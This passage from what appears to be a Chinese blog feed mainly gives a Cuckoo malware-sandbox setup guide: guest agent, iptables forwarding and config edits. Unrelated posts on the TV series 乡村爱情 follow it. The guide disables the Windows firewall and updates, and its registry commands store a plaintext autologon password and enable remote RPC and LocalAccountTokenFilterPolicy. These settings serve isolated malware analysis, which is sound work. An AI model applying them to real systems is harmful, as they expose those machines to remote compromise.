安装客户端</h2><p>上传<code>agent.py</code>文件至win7虚拟机：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/cuckoo/.cuckoo/agent</span><br><span class="line">cp agent.py ~/Downloads</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/02/01/vDYqUjB2SOiP5r6.png" width="550" height="300" alt="图片名称" align="center" id="55"><p>自启动：复制agent.py文件并将其放置在<code>C:\Users\*USERNAME*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code><br><a href="http://xn--agent-r96ha042aba127eunoe5t2fjune271mg05a.py" target="_blank" rel="noopener">这将在启动虚拟机时启动agent.py</a>。在Windows7虚拟机上，需要显示隐藏的文件和文件夹才能看到AppData文件夹。<br>您可以通过进入“文件资源管理器”，然后进入“组织”&gt;“文件夹选项”来完成此操作。</p><img src="https://s2.loli.net/2022/02/01/k39m7tVqcN2YoTC.png" width="400" height="300" alt="图片名称" align="center" id="56"><img src="https://s2.loli.net/2022/02/01/54dthCes9iuBKDy.png" width="500" height="300" alt="图片名称" align="center" id="57"><p>一旦您对安装了所有必需的软件感到满意，请重新启动Windows7虚拟机并登录。你应该得到一个空白的命令窗口出现。如果出现网络弹出窗口，请单击“允许”。</p><img src="https://s2.loli.net/2022/02/01/k39m7tVqcN2YoTC.png" width="400" height="300" alt="图片名称" align="center" id="58"><img src="https://s2.loli.net/2022/02/01/LkHXv6ydEUP7btW.png" width="400" height="300" alt="图片名称" align="center" id="59"><p>现在可以最小化虚拟机。</p><h2 id="36-创建沙盒环境"><a class="markdownIt-Anchor" href="#36-创建沙盒环境"></a> 3.6 创建沙盒环境</h2><p>现在我们已经创建了Windows7虚拟机，我们需要设置网络来创建沙盒环境。单击VirtualBox管理器，然后单击Windows 7虚拟机的设置。选择网络，然后更改附加到：仅主机适配器，然后在名称中选择vboxnet0。单击“确定”。</p><img src="https://s2.loli.net/2022/02/01/a1xFih5vb9jWVew.png" width="600" height="300" alt="图片名称" align="center" id="59"><p>现在你需要让这个持久化。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y iptables-persistent</span><br></pre></td></tr></table></figure><p>现在我们需要配置IP转发，以便将internet连接从主机路由到来宾虚拟机。我们将使用iptables设置这些网络转发规则：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure><p>您可以通过运行<code>sudo iptables-L</code>来检查您的规则</p><p>现在在内核中启用IP转发，以便将这些设置设置为活动（WWW Internet访问需要）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 | sudo tee -a /proc/sys/net/ipv4/ip_forward</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>现在我们需要确保IP转发在重新启动后启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>把#从<code>net.ipv4.ip_forward=1</code>项移除，保存退出。<br>现在运行<code>sudo su -</code>然后<code>iptables-save &gt; /etc/iptables/rules.v4</code></p><p>现在我们需要配置Windows7虚拟机的IP地址信息。在中打开网络适配器并设置以下信息：</p><img src="https://s2.loli.net/2022/02/01/hcsV7YUqwFgCrv1.png" width="400" height="300" alt="图片名称" align="center" id="60"><p>单击“确定”和“确定”之后，您应该再次获得internet连接。</p><p>我们现在要拍摄虚拟机的快照，所以单击Machine&gt;takesnapshot。将其命名为Snapshot 1，然后单击ok。</p><h2 id="37-配置cuckoo服务"><a class="markdownIt-Anchor" href="#37-配置cuckoo服务"></a> 3.7 配置cuckoo服务</h2><p>我们现在需要在ubuntu20上完成cuckoo服务的配置。所有cuckoo配置文件都位于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.cuckoo/conf</span><br></pre></td></tr></table></figure><p>或您的主目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .cuckoo/</span><br></pre></td></tr></table></figure><p>切换到config目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/cuckoo/.cuckoo/conf</span><br></pre></td></tr></table></figure><p>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim cuckoo.conf</span><br></pre></td></tr></table></figure><p>编辑buckoo.conf文件确保设置了以下内容：<code>machine=virtualbox</code><br>和<code>memory_dump=yes</code><br>和<code>resultserver ip=192.168.56.1</code>，<br>保存退出即可</p><p>通过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim auxiliary.conf</span><br></pre></td></tr></table></figure><p>编辑auxiliary.conf文件确保启用了<br><code>sniffer=yes</code></p><p>保存退出</p><p>通过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim virtualbox.conf</span><br></pre></td></tr></table></figure><p>编辑virtualbox.conf文件，并确保<br>virtualbox mode=gui<br>和machines=cuckoo1<br>（如果需要，将名称更改为您的Windows 7虚拟机名称，label=cuckoo1和platform=Windows和ip=192.168.56.101和snapshot=snapshot 1），<br>保存退出</p><p>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim processing.conf</span><br></pre></td></tr></table></figure><p>编辑processing.conf文件，<br>确保<code>memory enabled=yes</code>，</p><p>保存退出</p><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim memory.conf</span><br></pre></td></tr></table></figure><p>编辑memory.conf文件，<br>确保<code>basic guest_profile=Win7SP1x64</code>，</p><p>保存退出</p><p>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim reporting.conf</span><br></pre></td></tr></table></figure><p>编辑reporting.conf文件，确保singlefile启用<br><code>report.html enabled=yes</code>和<code>mongodb enabled=yes</code>的创建，</p><p>保存退出</p><h2 id="38-启动cuckoo"><a class="markdownIt-Anchor" href="#38-启动cuckoo"></a> 3.8 启动cuckoo</h2><p>现在关闭Windows7虚拟机，然后重新启动Ubuntu虚拟机。以<font color="red"><strong>同一用户身份</strong></font>重新登录（不要以cuckoo用户身份登录）</p><p><strong>dragon</strong>用户下激活虚拟环境：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  graduation . ./venv/bin/activate</span><br><span class="line">(venv) ➜  graduation</span><br></pre></td></tr></table></figure><p>现在要使用cuckoo你首先需要更新cuckoo的签名，所以打开一个终端并键入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(venv) ➜  graduation cuckoo community                 </span><br><span class="line">/home/dragon/graduation/venv/lib/python2.7/site-packages/sflock/decode/office.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">2022-02-02 20:54:28,277 [cuckoo.apps.apps] INFO: Downloading.. https://github.com/cuckoosandbox/community/archive/master.tar.gz</span><br><span class="line">2022-02-02 20:54:33,956 [cuckoo] INFO: Finished fetching &amp; extracting the community files!</span><br></pre></td></tr></table></figure><p>现在在终端窗口1中键入<code>cuckoo</code>并按回车键。你将得到启动cuckoo，它将坐在等待分析任务。</p><p>在第二个终端窗口中键入 <code>cuckoo web runserver 0.0.0.0:8000</code></p><img src="https://s2.loli.net/2022/02/02/IOe5Xy8GCtPLVjK.png" width="800" height="400" alt="图片名称" align="center" id="61"><p>现在您可以通过<code>127.0.0.1:8000</code>访问cuckoo网络服务器，或者通过浏览器访问本地网络上的虚拟机IP地址。</p><img src="https://s2.loli.net/2022/02/02/6FYTpnrKShyx1li.png" width="800" height="400" alt="图片名称" align="center" id="62"><p>然后提交分析即可，生成报告如下：</p><img src="https://s2.loli.net/2022/02/02/OxT9wCd6FBkUehX.png" width="800" height="400" alt="图片名称" align="center" id="63"><h1 id="4-guest安装在vmware中与ubuntu并列未完成失败"><a class="markdownIt-Anchor" href="#4-guest安装在vmware中与ubuntu并列未完成失败"></a> 4 guest安装(在Vmware中，与Ubuntu并列，未完成，失败)</h1><h2 id="41-创建win7-x64虚拟机"><a class="markdownIt-Anchor" href="#41-创建win7-x64虚拟机"></a> 4.1 创建win7-x64虚拟机</h2><ul><li><p>镜像下载：<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">MSDN</a> （需要Service Pack 1，否则vmtools安装报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win7企业版安装vmtool提示无法进行，需要更新到SP1</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/01/31/vRTVYMeOB6nWCXi.png" width="600" height="300" alt="图片名称" align="center" id="38"><p>此<a href="https://blog.csdn.net/kinnisoy/article/details/105299515" target="_blank" rel="noopener">教程</a>无效</p></li><li><p>按照步骤安装即可</p></li><li><p>安装VMware Tools（如果安装失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows 无法验证此驱动程序软件的发布者</span><br></pre></td></tr></table></figure><p>使用此<a href="http://softwareupdate.vmware.com/cds/vmw-desktop/ws/15.5.0/14665864/windows/packages/tools-windows.tar" target="_blank" rel="noopener">ISO映像文件</a>安装即可，教程的<a href="https://blog.csdn.net/DCTANT/article/details/117886423" target="_blank" rel="noopener">评论</a>中提及的</p></li></ul><h2 id="42-依赖"><a class="markdownIt-Anchor" href="#42-依赖"></a> 4.2 依赖</h2><h3 id="421-安装python"><a class="markdownIt-Anchor" href="#421-安装python"></a> 4.2.1 安装python</h3><p>Python 是 Cuckoo 客户端（分析器） 正常工作的必须软件。</p><ol><li>官网下载安装 Python2.7 版本；</li><li>如果安装的时侯选择 add python to path,则会自动完成环境变量配置；否则需要手动添加</li></ol><p>Cuckoo 客户端组件依赖于部分额外的Python 库， 包括: <a href="https://python-pillow.org/" target="_blank" rel="noopener">Python Pillow</a>: 截图组件需要用到。下载<a href="https://pypi.python.org/packages/2.7/P/Pillow/Pillow-2.5.3.win-amd64-py2.7.exe#md5=33c3a581ff1538b4f79b4651084090c8" target="_blank" rel="noopener">安装包</a>后双击运行即可。</p><p>这些组件不是必须要安装的， 但是不安装的话，分析组件的部分功能就无法正常使用。</p><h3 id="422-其他软件"><a class="markdownIt-Anchor" href="#422-其他软件"></a> 4.2.2 其他软件</h3><p>至此，Cuckoo 正常工作所需的软件的已经安装完成了。</p><p>不过根据你需要分析的文件类型， 也同时需要安装相应的软件， 例如(谷歌)浏览器，PDF阅读器，Office软件等。 记得要关闭这些软件的检查更新和自动更新。</p><p>这些额外的软件是否需要安装，完全取决于你是否所需。 可以阅读 <a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/introduction/sandboxing.html" target="_blank" rel="noopener">沙箱</a> 章节了解更多的信息.</p><h2 id="43-网络配置"><a class="markdownIt-Anchor" href="#43-网络配置"></a> 4.3 网络配置</h2><h3 id="431-windows-设置"><a class="markdownIt-Anchor" href="#431-windows-设置"></a> 4.3.1 Windows 设置</h3><p>在配置底层网络之前，可能需要调整一些windows虚拟机的内部配置。</p><p>最重要的事情是关闭控制面板中的 <em>Windows 防火墙</em> 和 <em>自动更新</em>。 这些都会影响恶意软件的行为，进而影响Cuckoo对这些行为的分析。</p><h3 id="432-虚拟网络"><a class="markdownIt-Anchor" href="#432-虚拟网络"></a> 4.3.2 虚拟网络</h3><p>现在可以决定虚拟机如何访问互联网或者本地局域网。</p><p>以前老的版本中， Cuckoo 虚拟机和宿主机之间的数据是通过共享文件夹进行交互。 从0.4版本起，则通过XMLRPC 协议来交互。</p><p>所以，需要配置给虚拟机配置静态IP，配置完成后，通过PING来测试虚拟机与宿主机之间 的通信是否正常。不要使用DHCP， 每次IP都不同的情况下，无法正常通信。</p><p>这些配置都要依赖于你的需求和所选的虚拟机软件的特性。</p><blockquote><p>警告：虚拟网络报错! 虚拟网络配置是非常重要的部分。大部分Cuckoo遇到的问题都与网络配置有关系。 在你配置完成之后， 尽量用PING和TELNET工具测试是否正常。</p></blockquote><p>推荐使用 <em>Host-Only</em> 模式的虚拟网络。</p><hr><p><strong>win7虚拟机使用nat模式配置静态IP上网：（未完成）</strong> <a href="https://blog.csdn.net/qq_40657585/article/details/108268552" target="_blank" rel="noopener">链接</a></p><p>查看ubuntu20.04 LTS的ip地址，配置window7客户机的ipv4地址的默认网关和DNS地址为ubuntu的ip地址，如下：</p><img src="https://s2.loli.net/2022/01/31/zCv8PyLSDpwJUKO.png" width="600" height="300" alt="图片名称" align="center" id="39"><hr><p>使用NAT模式DHCP：</p><ul><li>Ubuntu：192.168.10.128</li><li>Win7：192.168.10.134</li></ul><hr><h2 id="43-安装客户端"><a class="markdownIt-Anchor" href="#43-安装客户端"></a> 4.3 安装客户端</h2><p>从0.4版本起， Cuckoo设计了以跨平台的交互客户端，可以在Windows， Android， Linux 和Mac OSX 系统上运行。</p><p>只有安装和启动了Cuckoo 客户端， 分析才能工作正常。</p><p>客户端的安装和启动是十分简单的。</p><p>在 <code>$CWD/agent/</code> 目录中，可以找到 <code>agent.py</code> 文件。 把文件拷贝到虚拟机中， 然后将脚本启动起来。 客户端会启动一个小型的API服务，用于与宿主机通信。</p><p>在Windows系统中， 只要将脚本名称 从 <code>agent.py</code> 改为 <strong>agent.pyw</strong> ， 可以在运行的时候不显示终端的窗口。</p><p>将脚本拷贝到 启动 目录， 即可实现脚本开机自启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v AutoAdminLogon /d 1 /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\system\CurrentControlSet\Control\TerminalServer"</span> /v AllowRemoteRPC /d 0x01 /t REG_DWORD /f</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> /v LocalAccountTokenFilterPolicy /d 0x01 /t REG_DWORD /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultUserName /d guest2 /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v DefaultPassword /d root /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon"</span> /v AutoAdminLogon /d 1 /t REG_SZ /f</span><br><span class="line">reg add <span class="string">"hklm\system\CurrentControlSet\Control\TerminalServer"</span> /v AllowRemoteRPC /d 0x01 /t REG_DWORD /f</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"</span> /v LocalAccountTokenFilterPolicy /d 0x01 /t REG_DWORD /f</span><br></pre></td></tr></table></figure><h1 id="5-参考"><a class="markdownIt-Anchor" href="#5-参考"></a> 5 参考</h1><ul><li><a href="https://fl4g.cn/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/" target="_blank" rel="noopener">Cuckoo-Sandbox学习-安装篇</a></li><li><a href="https://blog.csdn.net/ElsonHY/article/details/115607255" target="_blank" rel="noopener">Ubuntu20.04系统Cuckoo sandbox所需环境搭建及安装(超详细图文)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>示例-《xxx》纪录片</title>
      <link href="/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8Axxx%E3%80%8B%E7%BA%AA%E5%BD%95%E7%89%87/"/>
      <url>/2022/01/21/%E7%A4%BA%E4%BE%8B-%E3%80%8Axxx%E3%80%8B%E7%BA%AA%E5%BD%95%E7%89%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Life is painting a picture, not doing a sum.</p>]]></content>
      
      
      <categories>
          
          <category> 影视 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 纪录片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《乡村爱情系列》电视剧</title>
      <link href="/2022/01/21/%E3%80%8A%E4%B9%A1%E6%9D%91%E7%88%B1%E6%83%85%E7%B3%BB%E5%88%97%E3%80%8B%E7%94%B5%E8%A7%86%E5%89%A7/"/>
      <url>/2022/01/21/%E3%80%8A%E4%B9%A1%E6%9D%91%E7%88%B1%E6%83%85%E7%B3%BB%E5%88%97%E3%80%8B%E7%94%B5%E8%A7%86%E5%89%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Life is painting a picture, not doing a sum.</p><h1 id="1-乡村爱情2006"><a class="markdownIt-Anchor" href="#1-乡村爱情2006"></a> 1 乡村爱情（2006）</h1><h2 id="11-影片信息"><a class="markdownIt-Anchor" href="#11-影片信息"></a> 1.1 影片信息</h2><ul><li>片名：乡村爱情</li><li>又名：Rural Love Story</li><li>导演：张惠中</li><li>编剧：张继</li><li>主演：赵本山/范伟/王亚彬/于月仙/唐鉴军/王小利/贺树峰</li><li>播出：CCTV1</li><li>首播：2006-09-30（中国大陆）</li><li>类型：喜剧/剧情/爱情</li><li>集数：30</li><li>每集：45分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="12-剧情简介"><a class="markdownIt-Anchor" href="#12-剧情简介"></a> 1.2 剧情简介</h2><p>乡村青年谢永强（贺树峰 饰）是个林业大学毕业生，回乡待业期间和同村女孩王小蒙（王亚彬 饰）谈起恋爱，但遭到父亲谢广坤（唐鉴军 饰）强烈反对，引起一直希望儿子出人头地，而王小蒙父亲王老七（蔡维利 饰）听闻此事倍感自尊受伤，也表态不许女儿嫁给谢永强。两个年轻人爱情遭遇阻挠，尚有村长女儿香秀（王君平 饰）适时表达对谢永强的爱慕，为了未来工作，谢永强在家人干涉下阴差阳错与香秀定了亲，那边厢王小蒙也受到村养殖场场长刘一水（闫光明 饰）和邻居赵玉田（吴云飞 饰）的追求。怎料工作分配结果下来，谢永强最终没有分到城里，一心想通过他当上城里人的香秀很失望，就此疏远了他，王小蒙和他重新拾起了感情，二人开始脚踏实地开发山里林果基地，怎料县里的录取通知书又突然到来……</p><h1 id="2-乡村爱情ii2008"><a class="markdownIt-Anchor" href="#2-乡村爱情ii2008"></a> 2 乡村爱情Ⅱ（2008）</h1><h2 id="21-影片信息"><a class="markdownIt-Anchor" href="#21-影片信息"></a> 2.1 影片信息</h2><ul><li>片名：乡村爱情Ⅱ</li><li>又名：乡村爱情2</li><li>导演：赵本山</li><li>编剧：张继</li><li>主演：赵本山/贺树峰/王亚彬/于月仙/小沈阳/王小宝/王小利/唐鉴军/蒋依杉/吴云飞/王君平/蔡维利/刘小光</li><li>首播：2008-02-10（中国大陆）</li><li>类型：喜剧</li><li>集数：41</li><li>每集：42分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="22-剧情简介"><a class="markdownIt-Anchor" href="#22-剧情简介"></a> 2.2 剧情简介</h2><p>在第二部里，象牙山村中的年轻人们找到了各自事业的方向，不过他们的爱情却有一波三折。</p><p>王小蒙（王亚彬 饰）的豆腐厂上线，每天忙里忙外，不得清闲。谢永强（贺树峰 饰）则专注自己的果园，和小蒙几天都见不上一面。两个孩子忙事业始终推迟婚期，急坏永强的父亲谢广坤（唐鉴军 饰）；赵玉田（吴云飞 饰）和刘英（蒋依杉 饰）结婚后，开始忙于花圃的经营。来村中实习的女大学生陈艳南吸引了赵玉田的注意，刘英大吃其醋，无事忙刘能（王小利 饰）对女婿的做法也颇为不满；香秀（王君平 饰）迎来了新同事王天来（小沈阳 饰），李大国（王小虎 饰）担心嫉妒，从中作梗。王天来单恋陈艳南，又和赵玉田矛盾不断；长贵（王小宝 饰）一方面想吸引王大拿（赵本山 饰）来村里投资，一方面又怕谢大脚（于月仙 饰）被大拿抢走，他和大脚之间若即若离，忽冷忽热，闹出不少笑话。</p><p>矛盾归矛盾，误会归误会，所幸有情人终成眷属，象牙山的青年男女最终得到属于自己的幸福……</p><h1 id="3-乡村爱情故事2010"><a class="markdownIt-Anchor" href="#3-乡村爱情故事2010"></a> 3 乡村爱情故事（2010）</h1><h2 id="31-影片信息"><a class="markdownIt-Anchor" href="#31-影片信息"></a> 3.1 影片信息</h2><ul><li>片名：乡村爱情故事</li><li>又名：乡村爱情3/乡村爱情Ⅲ/乡村爱情Ⅲ前传</li><li>导演：赵本山/徐正超</li><li>编剧：张继</li><li>主演：于月仙/小沈阳/王小利/刘小光/赵本山/刘流/贺树峰/王小宝/毕畅</li><li>播出：CCTV1</li><li>首播：2010-02-16（中国大陆）</li><li>类型：喜剧</li><li>集数：36</li><li>每集：41分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="32-剧情介绍"><a class="markdownIt-Anchor" href="#32-剧情介绍"></a> 3.2 剧情介绍</h2><p>自从象牙山的有情人们终成眷属之后，这个小小的山村发生了巨大的变化：王大拿（赵本山 饰）的王氏集团决定在此投资，谢永强（贺树峰 饰）担任投资工程的副总，却和刘大脑袋（刘流 饰）发生不和；王小蒙（毕畅 饰）的豆腐厂越做越大，开始考虑和上海的大企业合作；刘能（王小利 饰）撺掇老四（刘小光 饰）上镇上告长贵（王小宝 饰）的状，惹出了一堆笑话；赵玉田（吴云飞 饰）收心敛性开始好好过日子，而刘英则凭借怀孕的优势在赵家的地位陡然提升；谢广坤（唐鉴军 饰）陪儿媳妇去了一趟上海，不仅学得一口蹩脚的上海话，还迷上了对方公司的主管；刘一水专心自己的畜牧场，而老婆却希望他出任象牙山村的村主任……</p><p>新的一年，新的故事，在这个我们熟悉的山村继续上演……</p><h1 id="4-乡村爱情交响曲2011"><a class="markdownIt-Anchor" href="#4-乡村爱情交响曲2011"></a> 4 乡村爱情交响曲（2011）</h1><h2 id="41-影片信息"><a class="markdownIt-Anchor" href="#41-影片信息"></a> 4.1 影片信息</h2><ul><li>片名：乡村爱情交响曲</li><li>又名：乡村爱情第四部/乡村爱情4</li><li>导演：徐正超</li><li>编剧：张继</li><li>主演：赵本山/贺树峰/毕畅/小沈阳/吴云飞/于月仙/王小宝/闫光明/王小利/唐鉴军/蔡维利/蒋依杉/王小虎/关婷娜/刘流</li><li>首播：2011-05-05（中国大陆）</li><li>类型：剧情/喜剧</li><li>集数：37</li><li>每集：45分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="42-剧情介绍"><a class="markdownIt-Anchor" href="#42-剧情介绍"></a> 4.2 剧情介绍</h2><p>象牙山村的故事继续上演：谢兰和皮长生喜得贵子，美坏了外公谢广坤（唐鉴军 饰），整天抱着孩子招摇过市，这便急煞了刘能（王小利 饰）和赵四（刘小光 饰）。为早日实现传宗接代的大业，赵四将玉田（吴云飞 饰）和刘英（蒋依杉 饰）关在屋里，一门心思造人；广坤得意的同时，又给永强（贺树峰 饰）和小蒙（毕畅 饰）施加压力，逼他们早日要孩子，结果是纷争连连，也让相爱的两人心生离析；长贵（王小宝 饰）事业一帆风顺，升任水利站站长，由此变得有些飘飘然，开始想尽一切办法大拍齐镇长马屁，反而弄巧成拙。</p><p>此外，王天来（小沈阳 饰）、王大拿（赵本山 饰）、刘大脑袋（刘流 饰）、刘一水……各自有着各自的故事，有着各自的喜怒哀乐……</p><h1 id="5-乡村爱情小夜曲2012"><a class="markdownIt-Anchor" href="#5-乡村爱情小夜曲2012"></a> 5 乡村爱情小夜曲（2012）</h1><h2 id="51-影片信息"><a class="markdownIt-Anchor" href="#51-影片信息"></a> 5.1 影片信息</h2><ul><li>片名：乡村爱情小夜曲</li><li>又名：乡村爱情5</li><li>导演：赵本山/徐正超</li><li>编剧：张继</li><li>主演：赵本山/毕畅/贺树峰/王小利/于月仙/唐鉴军/王小宝/刘小光//蔡维利/刘流/蒋依杉/吴云飞/王小虎/王君平/小沈阳</li><li>播出：山东卫视</li><li>首播：2012-01-27（中国大陆）</li><li>类型：喜剧</li><li>集数：44</li><li>每集：44分钟</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="52-剧情介绍"><a class="markdownIt-Anchor" href="#52-剧情介绍"></a> 5.2 剧情介绍</h2><p>新的一年来到，我们熟悉的象牙山村发生了许许多多令人耳目一新的变化。家家户户用上了电脑，与外界的联系更为紧密；服装和潮流紧跟时代的步伐，村民们更潮了；大脚超市规模扩大，俨然正“做大做强”。就在红火生活的另一边，人们的烦恼又徒然增多。谢大脚（于月仙 饰）和长贵（王小宝 饰）因苏玉红的存在矛盾不断，婚姻走向破裂；谢广坤（唐鉴军 饰）看着刘能即将抱上外孙心急火燎，于是试图拆散小蒙（毕畅 饰）和永强（贺树峰 饰）的婚姻；王大拿（赵本山 饰）本好心帮大脚夫妇结尾，谁曾想惹来杨小燕猜忌；刘能则和赵四为了外孙展开连番较量。</p><p>新的喜悦，新的烦恼，穿插在象牙山村可爱的村民之间……</p><h1 id="6-乡村爱情变奏曲2013"><a class="markdownIt-Anchor" href="#6-乡村爱情变奏曲2013"></a> 6 乡村爱情变奏曲（2013）</h1><h2 id="61-影片信息"><a class="markdownIt-Anchor" href="#61-影片信息"></a> 6.1 影片信息</h2><ul><li>片名：乡村爱情变奏曲</li><li>又名：乡村爱情6</li><li>导演：刘流/周英男</li><li>编剧：张继</li><li>主演：赵本山/刘小光/唐鉴军 / 贺树峰/毕畅/ 于月仙/刘流/ 王小利/ 蒋依杉/吴云飞/ 王小宝/葛珊珊/闫光明/杜肖雄 / 蔡维利/ 王小虎 / 王君平 /孟令宇/ 李琳/ 王晓曦/ 金玫玫/ 吴一迪/金鸿鸣/关婷娜/ 王卓/ 董三毛/付小兰/赵海燕/王小华 / 孙立荣/ 筱素清/ 张小飞 /高贺迪</li><li>首播：2013-02-12（中国大陆）</li><li>类型：剧情</li><li>集数：50</li><li>地区：中国大陆</li><li>语言：汉语普通话</li></ul><h2 id="62-剧情介绍"><a class="markdownIt-Anchor" href="#62-剧情介绍"></a> 6.2 剧情介绍</h2><p>新的一年，象牙村百姓们平凡而有趣的故事如期上演。饱受家庭、事业危机困扰的长贵（王小宝 饰）否极泰来，因见义勇为重新获得了村民的尊敬和领导的信任，一时间有点飘飘然；山庄上，刘大脑袋（刘流 饰）欲擒故纵，成功从王大拿（赵本山 饰）手中得权，并好好整治了好高骛远的王天来（小沈阳 饰）；不小心流产的王小蒙（毕畅 饰），得到蒙在鼓里的谢广坤（唐鉴军 饰）无微不至的照顾，心中充满不安的她与永强的关系似乎也悄悄发生变化；徐会计扶正支书职务，赵玉田（吴云飞 饰）也勉为其难担任村主任，胸怀大志的一群人外出考察，却将骗子带回象牙村。</p><p>除此之外，还有我们熟悉的刘能、老四、香秀等等，各自上演引人入胜的小故事……</p><h1 id="7-乡村爱情圆舞曲2014"><a class="markdownIt-Anchor" href="#7-乡村爱情圆舞曲2014"></a> 7 乡村爱情圆舞曲（2014）</h1><h2 id="71-影片信息"><a class="markdownIt-Anchor" href="#71-影片信息"></a> 7.1 